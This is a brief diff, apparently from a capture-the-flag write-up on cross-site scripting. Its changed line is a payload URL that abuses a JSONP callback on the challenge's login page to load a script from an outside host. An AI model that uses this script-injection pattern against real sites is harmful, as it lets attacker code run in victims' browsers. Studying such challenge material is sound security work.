@@ -45,7 +45,7 @@ self.addEventListener('fetch', function (event) {
 
 
 ```
-https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=jsonp("https://li3hiu.lihuaiqiu.repl.co/2.js");
+https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=jsonp("https://li3hiu.lihuaiqiu.repl.co/test.js");
 ```
 
 
